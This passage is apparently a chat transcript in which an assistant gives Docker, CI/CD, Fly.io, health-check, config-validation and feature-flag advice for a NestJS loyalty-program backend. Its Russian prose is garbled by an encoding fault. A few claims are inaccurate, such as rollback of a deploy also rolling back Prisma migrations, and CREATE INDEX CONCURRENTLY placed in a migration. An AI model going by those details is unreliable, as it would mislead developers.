      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 3s
      retries: 5

  # MinIO –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ S3 (–≤–º–µ—Å—Ç–æ Cloudflare R2)
  minio:
    image: minio/minio:latest
    container_name: max-loyalty-minio
    command: server /data --console-address ":9001"
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin
    volumes:
      - minio_dev_data:/data
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:9000/minio/health/live"]
      interval: 30s
      timeout: 20s
      retries: 3

volumes:
  postgres_dev_data:
  redis_dev_data:
  minio_dev_data:
```

**–ó–∞–ø—É—Å–∫:**

```bash
# –°—Ç–∞—Ä—Ç –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã
docker-compose -f docker-compose.dev.yml up -d

# Backend –ª–æ–∫–∞–ª—å–Ω–æ
cd apps/backend
npm run dev

# Frontend –ª–æ–∫–∞–ª—å–Ω–æ
cd apps/frontend
npm run dev
```


***

### **4Ô∏è‚É£ .dockerignore: –ß—Ç–æ –∏—Å–∫–ª—é—á–∞—Ç—å?**

**–í–û–ü–†–û–°:** –ß—Ç–æ –¥–æ–±–∞–≤–∏—Ç—å –≤ .dockerignore —á—Ç–æ–±—ã —É—Å–∫–æ—Ä–∏—Ç—å build?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï:**

```dockerignore
# apps/backend/.dockerignore
node_modules
npm-debug.log
dist
coverage
.git
.gitignore
.env
.env.*
README.md
.vscode
.idea
*.md
.DS_Store
Thumbs.db
test
*.test.ts
*.spec.ts
.github
Dockerfile
docker-compose*.yml
```


***

### **5Ô∏è‚É£ –û–±—Ä–∞–∑—ã –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä (ARM64 vs AMD64)?**

**–í–û–ü–†–û–°:** Fly.io –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –∏ ARM64 –∏ AMD64. –°–æ–±–∏—Ä–∞—Ç—å –æ–±–∞?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) –¢–æ–ª—å–∫–æ AMD64** (–ø—Ä–æ—â–µ)

```dockerfile
FROM --platform=linux/amd64 node:20-alpine
```

**B) Multi-platform build** ‚≠ê (–ø–æ–¥–¥–µ—Ä–∂–∫–∞ M1 Mac + production)

```bash
docker buildx build --platform linux/amd64,linux/arm64 -t backend:latest .
```


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: B) Multi-platform**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –†–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ M1/M2 Mac (ARM64) –±–µ–∑ Rosetta
- ‚úÖ Fly.io –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤—ã–±–µ—Ä–µ—Ç –Ω—É–∂–Ω—É—é –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—É
- ‚úÖ Node 20 alpine –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –æ–±–µ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã

**–í GitHub Actions:**

```yaml
- name: Build and push Docker image
  uses: docker/build-push-action@v5
  with:
    platforms: linux/amd64,linux/arm64
    push: true
    tags: |
      ghcr.io/${{ github.repository }}/backend:latest
      ghcr.io/${{ github.repository }}/backend:${{ github.sha }}
```


***

### **6Ô∏è‚É£ Health check endpoint: –ö–∞–∫ –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∑–¥–æ—Ä–æ–≤—å–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞?**

**–í–û–ü–†–û–°:** –ß—Ç–æ –¥–æ–ª–∂–µ–Ω –ø—Ä–æ–≤–µ—Ä—è—Ç—å `/health` endpoint?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) –ü—Ä–æ—Å—Ç–æ–π ping (—Ç–æ–ª—å–∫–æ HTTP 200)**

```typescript
@Get('health')
health() {
  return { status: 'ok' };
}
```

**B) Database + Redis check** ‚≠ê

```typescript
@Get('health')
async health() {
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º DB
  await this.prisma.$queryRaw`SELECT 1`;
  
  // –ü—Ä–æ–≤–µ—Ä—è–µ–º Redis
  await this.redis.ping();
  
  return {
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  };
}
```

**C) –î–µ—Ç–∞–ª—å–Ω—ã–π health check (database, redis, s3, external APIs)**

```typescript
@Get('health')
async health() {
  const checks = await Promise.allSettled([
    this.checkDatabase(),
    this.checkRedis(),
    this.checkS3(),
    this.checkPOSConnection()
  ]);
  
  return {
    status: checks.every(c => c.status === 'fulfilled') ? 'ok' : 'degraded',
    checks: {
      database: checks[0].status,
      redis: checks[1].status,
      s3: checks[2].status,
      pos: checks[3].status
    }
  };
}
```


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: C) –î–µ—Ç–∞–ª—å–Ω—ã–π —Å grace period**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –í–∏–¥–∏–º –∫–∞–∫–æ–π —Å–µ—Ä–≤–∏—Å —É–ø–∞–ª
- ‚úÖ –ú–æ–∂–µ–º routing –Ω–∞ –∑–¥–æ—Ä–æ–≤—ã–µ –∏–Ω—Å—Ç–∞–Ω—Å—ã
- ‚úÖ Better Stack –º–æ–∂–µ—Ç –ø–æ–∫–∞–∑–∞—Ç—å –¥–µ—Ç–∞–ª–∏

**–†–µ–∞–ª–∏–∑–∞—Ü–∏—è:**

```typescript
// apps/backend/src/health/health.controller.ts
import { Controller, Get } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { RedisService } from '@/redis/redis.service';
import { S3Service } from '@/storage/s3.service';

@Controller('health')
export class HealthController {
  constructor(
    private prisma: PrismaService,
    private redis: RedisService,
    private s3: S3Service,
  ) {}

  @Get()
  async check() {
    const checks = {
      database: await this.checkDatabase(),
      redis: await this.checkRedis(),
      s3: await this.checkS3(),
    };

    const allHealthy = Object.values(checks).every(c => c.status === 'ok');

    return {
      status: allHealthy ? 'ok' : 'degraded',
      timestamp: new Date().toISOString(),
      uptime: process.uptime(),
      checks,
    };
  }

  private async checkDatabase() {
    try {
      await this.prisma.$queryRaw`SELECT 1`;
      return { status: 'ok', latency: 0 }; // –º–æ–∂–Ω–æ –∑–∞–º–µ—Ä–∏—Ç—å latency
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  private async checkRedis() {
    try {
      const start = Date.now();
      await this.redis.ping();
      return { status: 'ok', latency: Date.now() - start };
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  private async checkS3() {
    try {
      // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å bucket
      await this.s3.headBucket({ Bucket: process.env.S3_BUCKET });
      return { status: 'ok' };
    } catch (error) {
      return { status: 'error', message: error.message };
    }
  }

  // Liveness probe (–¥–ª—è Kubernetes/Fly.io)
  @Get('live')
  liveness() {
    return { status: 'ok' };
  }

  // Readiness probe (–≥–æ—Ç–æ–≤ –ª–∏ –ø—Ä–∏–Ω–∏–º–∞—Ç—å —Ç—Ä–∞—Ñ–∏–∫)
  @Get('ready')
  async readiness() {
    const dbCheck = await this.checkDatabase();
    if (dbCheck.status === 'error') {
      throw new Error('Database not ready');
    }
    return { status: 'ok' };
  }
}
```

**Dockerfile healthcheck:**

```dockerfile
HEALTHCHECK --interval=30s --timeout=3s --start-period=40s --retries=3 \
  CMD node -e "require('http').get('http://localhost:3000/health/live', (r) => {process.exit(r.statusCode === 200 ? 0 : 1)})"
```


***

### **7Ô∏è‚É£ Graceful shutdown: –ö–∞–∫ –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä?**

**–í–û–ü–†–û–°:** –ö–∞–∫ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å SIGTERM –ø—Ä–∏ –æ—Å—Ç–∞–Ω–æ–≤–∫–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ (–Ω–µ –ø–æ—Ç–µ—Ä—è—Ç—å –∑–∞–ø—Ä–æ—Å—ã)?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï:**

```typescript
// apps/backend/src/main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Enable graceful shutdown
  app.enableShutdownHooks();
  
  await app.listen(3000);
  
  // Handle SIGTERM (–æ—Ç Docker/Kubernetes)
  process.on('SIGTERM', async () => {
    console.log('SIGTERM received, closing HTTP server...');
    await app.close();
    console.log('HTTP server closed');
    process.exit(0);
  });
  
  // Handle SIGINT (Ctrl+C –ª–æ–∫–∞–ª—å–Ω–æ)
  process.on('SIGINT', async () => {
    console.log('SIGINT received, closing HTTP server...');
    await app.close();
    process.exit(0);
  });
}
bootstrap();
```

**Fly.io –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è:**

```toml
# fly.toml
[deploy]
  strategy = "rolling"
  wait_timeout = "5m"

[[services]]
  internal_port = 3000
  protocol = "tcp"
  
  # Grace period –ø–µ—Ä–µ–¥ —Ñ–æ—Ä—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–º kill
  [services.concurrency]
    type = "connections"
    hard_limit = 1000
    soft_limit = 800
  
  # –í—Ä–µ–º—è –Ω–∞ graceful shutdown
  kill_timeout = 30
```


***

### **8Ô∏è‚É£ Secrets –≤ Docker: –ö–∞–∫ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ?**

**–í–û–ü–†–û–°:** –ö–∞–∫ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å DATABASE_URL, API –∫–ª—é—á–∏ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –±–µ–∑–æ–ø–∞—Å–Ω–æ?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) Environment variables (—á–µ—Ä–µ–∑ fly.toml)** ‚≠ê

```bash
fly secrets set DATABASE_URL="postgresql://..."
fly secrets set REDIS_URL="redis://..."
fly secrets set JWT_SECRET="..."
```

**B) Docker secrets (–¥–ª—è Swarm/Kubernetes)**

```yaml
secrets:
  db_password:
    file: ./secrets/db_password.txt
```

**C) .env —Ñ–∞–π–ª –≤ production (‚ùå –ù–ï –†–ï–ö–û–ú–ï–ù–î–£–ï–¢–°–Ø)**

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: A) Fly.io secrets**

**–ü–æ—á–µ–º—É:**

- ‚úÖ Encrypted at rest
- ‚úÖ –ù–µ –ø–æ–ø–∞–¥–∞—é—Ç –≤ git
- ‚úÖ –ù–µ –≤–∏–¥–Ω—ã –≤ –ª–æ–≥–∞—Ö
- ‚úÖ –ú–æ–∂–Ω–æ —Ä–æ—Ç–∏—Ä–æ–≤–∞—Ç—å –±–µ–∑ rebuild

**Setup:**

```bash
# Production secrets
fly secrets set \
  DATABASE_URL="postgresql://user:pass@neon.tech:5432/db" \
  REDIS_URL="redis://upstash.com:6379" \
  JWT_SECRET="$(openssl rand -base64 32)" \
  JWT_REFRESH_SECRET="$(openssl rand -base64 32)" \
  CLOUDFLARE_R2_ACCESS_KEY="..." \
  CLOUDFLARE_R2_SECRET_KEY="..." \
  RESEND_API_KEY="..." \
  SMS_RU_API_KEY="..." \
  BETTER_STACK_TOKEN="..."

# Staging secrets (–æ—Ç–¥–µ–ª—å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ)
fly secrets set -a max-loyalty-staging \
  DATABASE_URL="..." \
  # ...
```


***

## ‚öôÔ∏è **–ë–õ–û–ö 2: CI/CD PIPELINE (7 –≤–æ–ø—Ä–æ—Å–æ–≤)**

### **9Ô∏è‚É£ GitHub Actions: –°–∫–æ–ª—å–∫–æ workflow —Ñ–∞–π–ª–æ–≤?**

**–í–û–ü–†–û–°:** –û–¥–∏–Ω workflow –¥–ª—è –≤—Å–µ–≥–æ –∏–ª–∏ —Ä–∞–∑–¥–µ–ª–∏—Ç—å –ø–æ –∑–∞–¥–∞—á–∞–º?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) –û–¥–∏–Ω —Ñ–∞–π–ª `.github/workflows/main.yml`** (–≤—Å—ë –≤ –æ–¥–Ω–æ–º)

**B) –†–∞–∑–¥–µ–ª–µ–Ω–∏–µ –ø–æ –∑–∞–¥–∞—á–∞–º** ‚≠ê

```
.github/workflows/
‚îú‚îÄ‚îÄ test.yml          # –¢–µ—Å—Ç—ã –Ω–∞ –∫–∞–∂–¥—ã–π PR
‚îú‚îÄ‚îÄ deploy-backend.yml    # –î–µ–ø–ª–æ–π backend
‚îú‚îÄ‚îÄ deploy-frontend.yml   # –î–µ–ø–ª–æ–π frontend
‚îî‚îÄ‚îÄ cron-backup.yml      # –ï–∂–µ–¥–Ω–µ–≤–Ω—ã–π –±—ç–∫–∞–ø
```

**C) Monorepo workflow (–æ–¥–∏–Ω —Ñ–∞–π–ª, –Ω–æ matrix –¥–ª—è apps)**

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: B) –†–∞–∑–¥–µ–ª–µ–Ω–∏–µ –ø–æ –∑–∞–¥–∞—á–∞–º**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –ù–µ–∑–∞–≤–∏—Å–∏–º—ã–µ –¥–µ–ø–ª–æ–∏ (frontend –Ω–µ –∂–¥—ë—Ç backend)
- ‚úÖ –ü—Ä–æ—â–µ –¥–µ–±–∞–∂–∏—Ç—å
- ‚úÖ –ú–æ–∂–Ω–æ —Ä–∞–∑–Ω—ã–µ —Ç—Ä–∏–≥–≥–µ—Ä—ã

**–°—Ç—Ä—É–∫—Ç—É—Ä–∞:**

```yaml
# .github/workflows/test.yml
name: Test

on:
  pull_request:
    branches: [main, develop]
  push:
    branches: [main, develop]

jobs:
  test-backend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Lint
        run: npm run lint
      
      - name: Type check
        run: npm run type-check
      
      - name: Unit tests
        run: npm run test:unit
      
      - name: Integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/test
          REDIS_URL: redis://localhost:6379
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          files: ./coverage/lcov.info

  test-frontend:
    runs-on: ubuntu-latest
    steps:
      # ... –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ –¥–ª—è frontend
```

```yaml
# .github/workflows/deploy-backend.yml
name: Deploy Backend

on:
  push:
    branches: [main]
    paths:
      - 'apps/backend/**'
      - 'packages/**'
      - '.github/workflows/deploy-backend.yml'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Fly.io
        uses: superfly/flyctl-actions/setup-flyctl@master
      
      - name: Deploy to Fly.io
        run: flyctl deploy --remote-only
        working-directory: apps/backend
        env:
          FLY_API_TOKEN: ${{ secrets.FLY_API_TOKEN }}
      
      - name: Notify deployment
        uses: sarisia/actions-status-discord@v1
        if: always()
        with:
          webhook: ${{ secrets.DISCORD_WEBHOOK }}
          status: ${{ job.status }}
```

```yaml
# .github/workflows/deploy-frontend.yml
name: Deploy Frontend

on:
  push:
    branches: [main]
    paths:
      - 'apps/frontend/**'
      - '.github/workflows/deploy-frontend.yml'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Deploy to Vercel
        uses: amondnet/vercel-action@v25
        with:
          vercel-token: ${{ secrets.VERCEL_TOKEN }}
          vercel-org-id: ${{ secrets.VERCEL_ORG_ID }}
          vercel-project-id: ${{ secrets.VERCEL_PROJECT_ID }}
          vercel-args: '--prod'
          working-directory: apps/frontend
```


***

### **1Ô∏è‚É£0Ô∏è‚É£ Database migrations –≤ CI/CD: –ö–æ–≥–¥–∞ –∑–∞–ø—É—Å–∫–∞—Ç—å?**

**–í–û–ü–†–û–°:** –ö–æ–≥–¥–∞ –ø—Ä–∏–º–µ–Ω—è—Ç—å –º–∏–≥—Ä–∞—Ü–∏–∏ Prisma - –¥–æ –∏–ª–∏ –ø–æ—Å–ª–µ –¥–µ–ø–ª–æ—è?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) –ü–µ—Ä–µ–¥ –¥–µ–ø–ª–æ–µ–º (–≤ CI)** ‚≠ê

```yaml
- name: Run migrations
  run: npx prisma migrate deploy
  env:
    DATABASE_URL: ${{ secrets.DATABASE_URL }}

- name: Deploy
  run: flyctl deploy
```

**B) –ü–æ—Å–ª–µ –¥–µ–ø–ª–æ—è (–≤ postdeploy hook)**

```toml
# fly.toml
[deploy]
  release_command = "npx prisma migrate deploy"
```

**C) –í—Ä—É—á–Ω—É—é —á–µ—Ä–µ–∑ SSH**

***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: B) Release command –≤ Fly.io**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –ú–∏–≥—Ä–∞—Ü–∏–∏ –ø—Ä–∏–º–µ–Ω—è—é—Ç—Å—è –∞—Ç–æ–º–∞—Ä–Ω–æ —Å –¥–µ–ø–ª–æ–µ–º
- ‚úÖ Rollback –¥–µ–ø–ª–æ—è = rollback –º–∏–≥—Ä–∞—Ü–∏–π
- ‚úÖ –ù–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç CI pipeline

**fly.toml:**

```toml
[deploy]
  release_command = "sh -c 'npx prisma migrate deploy && npx prisma generate'"
  strategy = "rolling"
```

**–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å:**

```typescript
// –î–æ–±–∞–≤–ª—è–µ–º timeout –¥–ª—è –º–∏–≥—Ä–∞—Ü–∏–π
// prisma/migrations/20260212_add_guests/migration.sql
-- Timeout 10 —Å–µ–∫—É–Ω–¥
SET statement_timeout = '10s';

ALTER TABLE "Guest" ADD COLUMN "email" TEXT;
CREATE INDEX CONCURRENTLY "Guest_email_idx" ON "Guest"("email");
```


***

–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å –æ—Å—Ç–∞–ª—å–Ω—ã–º–∏ 25 –≤–æ–ø—Ä–æ—Å–∞–º–∏? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **1Ô∏è‚É£1Ô∏è‚É£ Environment-specific –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏: –ö–∞–∫ —É–ø—Ä–∞–≤–ª—è—Ç—å dev/staging/production?**

**–í–û–ü–†–û–°:** –ö–∞–∫ –æ—Ä–≥–∞–Ω–∏–∑–æ–≤–∞—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏–π?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) .env —Ñ–∞–π–ª—ã (dev/staging/production)**

```
.env.development
.env.staging
.env.production
```

**B) Config module —Å –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π** ‚≠ê

```typescript
// config/configuration.ts
import { z } from 'zod';

const configSchema = z.object({
  NODE_ENV: z.enum(['development', 'staging', 'production']),
  DATABASE_URL: z.string().url(),
  REDIS_URL: z.string().url(),
  JWT_SECRET: z.string().min(32),
  // ...
});

export const config = () => {
  const parsed = configSchema.safeParse(process.env);
  if (!parsed.success) {
    throw new Error(`Config validation error: ${parsed.error}`);
  }
  return parsed.data;
};
```

**C) –û—Ç–¥–µ–ª—å–Ω—ã–µ Fly.io –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –æ–∫—Ä—É–∂–µ–Ω–∏—è**

```bash
fly apps create max-loyalty-production
fly apps create max-loyalty-staging
fly apps create max-loyalty-dev
```


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: B) Config module + C) –û—Ç–¥–µ–ª—å–Ω—ã–µ Fly.io apps**

**–ü–æ—á–µ–º—É:**

- ‚úÖ Type-safe –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
- ‚úÖ –í–∞–ª–∏–¥–∞—Ü–∏—è –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ (fail fast)
- ‚úÖ –ò–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
- ‚úÖ –†–∞–∑–Ω—ã–µ –ë–î –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –æ–∫—Ä—É–∂–µ–Ω–∏—è

**–†–µ–∞–ª–∏–∑–∞—Ü–∏—è:**

```typescript
// apps/backend/src/config/configuration.ts
import { z } from 'zod';

const envSchema = z.object({
  // Environment
  NODE_ENV: z.enum(['development', 'staging', 'production']).default('development'),
  PORT: z.coerce.number().default(3000),
  
  // Database
  DATABASE_URL: z.string().url(),
  DATABASE_POOL_SIZE: z.coerce.number().default(10),
  
  // Redis
  REDIS_URL: z.string().url(),
  
  // JWT
  JWT_SECRET: z.string().min(32),
  JWT_REFRESH_SECRET: z.string().min(32),
  JWT_ACCESS_EXPIRY: z.string().default('15m'),
  JWT_REFRESH_EXPIRY: z.string().default('30d'),
  
  // Storage
  S3_ENDPOINT: z.string().url(),
  S3_BUCKET: z.string(),
  S3_ACCESS_KEY: z.string(),
  S3_SECRET_KEY: z.string(),
  S3_REGION: z.string().default('auto'),
  
  // Email
  RESEND_API_KEY: z.string(),
  
  // SMS
  SMS_RU_API_KEY: z.string(),
  
  // Monitoring
  BETTER_STACK_TOKEN: z.string().optional(),
  
  // External APIs
  YOOKASSA_SHOP_ID: z.string().optional(),
  YOOKASSA_SECRET_KEY: z.string().optional(),
});

export type Config = z.infer<typeof envSchema>;

export function validateConfig(): Config {
  const result = envSchema.safeParse(process.env);
  
  if (!result.success) {
    console.error('‚ùå Invalid environment variables:');
    console.error(JSON.stringify(result.error.format(), null, 2));
    throw new Error('Config validation failed');
  }
  
  return result.data;
}

export const config = validateConfig();
```

```typescript
// apps/backend/src/config/config.module.ts
import { Module, Global } from '@nestjs/common';
import { ConfigModule as NestConfigModule } from '@nestjs/config';
import { validateConfig } from './configuration';

@Global()
@Module({
  imports: [
    NestConfigModule.forRoot({
      isGlobal: true,
      validate: validateConfig,
      cache: true,
    }),
  ],
})
export class ConfigModule {}
```

**Fly.io apps:**

```bash
# Production
fly apps create max-loyalty-prod
fly secrets set -a max-loyalty-prod \
  DATABASE_URL="postgresql://prod..." \
  JWT_SECRET="..." \
  # ...

# Staging
fly apps create max-loyalty-staging
fly secrets set -a max-loyalty-staging \
  DATABASE_URL="postgresql://staging..." \
  JWT_SECRET="..." \
  # ...

# –î–µ–ø–ª–æ–π –≤ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–µ –æ–∫—Ä—É–∂–µ–Ω–∏–µ
fly deploy -a max-loyalty-staging
fly deploy -a max-loyalty-prod
```


***

### **1Ô∏è‚É£2Ô∏è‚É£ Feature flags: –ù—É–∂–Ω—ã –ª–∏ –¥–ª—è –ø–æ—Å—Ç–µ–ø–µ–Ω–Ω–æ–≥–æ —Ä–æ–ª–ª–∞—É—Ç–∞?**

**–í–û–ü–†–û–°:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å feature flags –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –Ω–æ–≤—ã—Ö —Ñ–∏—á –ø–æ—Å—Ç–µ–ø–µ–Ω–Ω–æ?

**–í–∞—Ä–∏–∞–Ω—Ç—ã:**

**A) –ë–µ–∑ feature flags (–¥–µ–ø–ª–æ–∏–º –≤—Å—ë —Å—Ä–∞–∑—É)**

**B) Simple boolean flags –≤ database** ‚≠ê

```typescript
// FeatureFlag entity
{
  key: 'loyalty_transfers_enabled',
  enabled: true,
  tenantId: null  // null = –≥–ª–æ–±–∞–ª—å–Ω–æ –¥–ª—è –≤—Å–µ—Ö
}
```

**C) LaunchDarkly / PostHog (external service)**

**D) Custom feature flag service —Å targeting**

```typescript
// –ú–æ–∂–Ω–æ –≤–∫–ª—é—á–∞—Ç—å –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö —Ç–µ–Ω–∞–Ω—Ç–æ–≤
{
  key: 'new_promo_engine',
  enabled: true,
  targeting: {
    tenants: ['tenant-123', 'tenant-456']
  }
}
```


***

## üéØ **–ú–û–Ø –†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–Ø: B) Simple boolean flags –≤ –Ω–∞—á–∞–ª–µ, D) –ø—Ä–∏ —Ä–æ—Å—Ç–µ**

**–ü–æ—á–µ–º—É:**

- ‚úÖ –ú–æ–∂–Ω–æ –≤–∫–ª—é—á–∞—Ç—å/–≤—ã–∫–ª—é—á–∞—Ç—å —Ñ–∏—á–∏ –±–µ–∑ –¥–µ–ø–ª–æ—è
- ‚úÖ A/B —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö —Ñ–∏—á
- ‚úÖ Kill switch –ø—Ä–∏ –±–∞–≥–∞—Ö
- ‚úÖ –ü–æ—Å—Ç–µ–ø–µ–Ω–Ω—ã–π rollout (—Å–Ω–∞—á–∞–ª–∞ 10% —Ç–µ–Ω–∞–Ω—Ç–æ–≤)

**–†–µ–∞–ª–∏–∑–∞—Ü–∏—è (Phase 1 - Simple):**

```typescript
// apps/backend/src/feature-flags/feature-flag.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';

export enum FeatureFlag {
  LOYALTY_TRANSFERS = 'loyalty_transfers',
  NEW_PROMO_ENGINE = 'new_promo_engine',
  TELEGRAM_MINI_APP = 'telegram_mini_app',
  ADVANCED_ANALYTICS = 'advanced_analytics',
}

@Injectable()
export class FeatureFlagService {
  constructor(private prisma: PrismaService) {}

  async isEnabled(flag: FeatureFlag, tenantId?: string): Promise<boolean> {
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º tenant-specific flag
    if (tenantId) {
      const tenantFlag = await this.prisma.featureFlag.findUnique({
        where: {
          key_tenantId: {
            key: flag,
            tenantId,
          },
        },
      });
      if (tenantFlag) return tenantFlag.enabled;
    }

    // Fallback –Ω–∞ –≥–ª–æ–±–∞–ª—å–Ω—ã–π flag
    const globalFlag = await this.prisma.featureFlag.findUnique({
      where: {
        key_tenantId: {
          key: flag,
          tenantId: null,
        },
      },
    });

    return globalFlag?.enabled ?? false;
  }

  async enable(flag: FeatureFlag, tenantId?: string) {
    await this.prisma.featureFlag.upsert({
      where: {
        key_tenantId: {
          key: flag,
          tenantId: tenantId ?? null,
        },
      },
      create: {
        key: flag,
        enabled: true,
        tenantId: tenantId ?? null,
      },
      update: {
        enabled: true,
      },
    });
  }

  async disable(flag: FeatureFlag, tenantId?: string) {
    await this.prisma.featureFlag.update({
      where: {
        key_tenantId: {
          key: flag,
          tenantId: tenantId ?? null,
        },
      },
      data: {
        enabled: false,
      },
    });
  }
}
```

**Guard –¥–ª—è –∑–∞—â–∏—Ç—ã endpoint:**

```typescript
// feature-flags/feature-flag.guard.ts
import { Injectable, CanActivate, ExecutionContext } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { FeatureFlagService, FeatureFlag } from './feature-flag.service';

@Injectable()
export class FeatureFlagGuard implements CanActivate {
  constructor(
    private reflector: Reflector,
    private featureFlagService: FeatureFlagService,
  ) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const flag = this.reflector.get<FeatureFlag>('featureFlag', context.getHandler());
    if (!flag) return true;

    const request = context.switchToHttp().getRequest();
    const tenantId = request.user?.tenantId;

    return this.featureFlagService.isEnabled(flag, tenantId);
  }
}

// Decorator
export const RequireFeature = (flag: FeatureFlag) => SetMetadata('featureFlag', flag);
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:**

```typescript
@Post('transfer')
@RequireFeature(FeatureFlag.LOYALTY_TRANSFERS)
@UseGuards(FeatureFlagGuard)
async transferBalls(@Body() dto: TransferBallsDto) {
  // –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ —Ñ–∏—á–∞ –≤–∫–ª—é—á–µ–Ω–∞
}
```


***

### **1Ô∏è‚É£3Ô∏è‚É£ Monitoring: –ö–∞–∫–∏–µ –º–µ—Ç—Ä–∏–∫–∏ —Å–æ–±–∏—Ä–∞—Ç—å?**

**–í–û–ü–†–û–°:** –ß—Ç–æ –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å –≤ production?

**–ú–û–Å –†–ï–®–ï–ù–ò–ï (Better Stack + Custom Metrics):**

